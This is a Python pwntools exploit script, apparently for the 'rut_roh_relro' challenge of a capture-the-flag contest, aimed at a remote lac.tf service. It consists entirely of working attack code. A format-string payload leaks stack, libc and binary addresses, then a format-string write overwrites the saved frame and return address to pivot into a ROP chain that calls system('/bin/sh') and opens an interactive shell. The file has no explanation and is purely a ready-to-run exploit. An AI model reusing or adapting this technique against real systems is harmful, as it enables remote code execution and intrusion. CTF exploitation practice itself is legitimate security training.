from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./rut_roh_relro"
libc_path = "./libc.so.6"
ld_path = "./ld-2.31.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("lac.tf", 31134)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    #pause()


delta = 0x7ffd18849be7 - 0x7ffd18849a10
libcdelate = 0x7fd96fcf5604 - 0x7fd96fc50000
elfdelate = 0x7f5d8dad6265 - 0x7f5d8dad5000 

payload = "%60$p-%61$p-%63$p"
io.sendlineafter("to post?\n", payload)
io.recvuntil("\n")
rbp_0x200 = int(io.recvuntil("-")[:-1], 16) - delta
success("rsp -> " + hex(rbp_0x200))

libc.address = int(io.recvuntil("-")[:-1], 16) - libcdelate
success("libcaddress -> " + hex(libc.address))

elf.address = int(io.recvuntil("\n"), 16) - elfdelate
success("elfcaddress -> " + hex(elf.address))

b = hex(elf.address + 0x1206)

leave_ret = elf.address + 0x0000000000001217
ret = elf.address + 0x0000000000001016
pop_rdi = elf.address + 0x000000000000127b

write_dict = { rbp_0x200 +0x200:rbp_0x200+224, rbp_0x200 +0x208:leave_ret }
payload = fmtstr_payload(6, write_dict,write_size="byte")
payload += p64(pop_rdi)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(ret)
payload += p64(libc.symbols["system"])

ddebug(f"b *{b}") 
io.sendlineafter("like to post?", payload)

io.interactive()
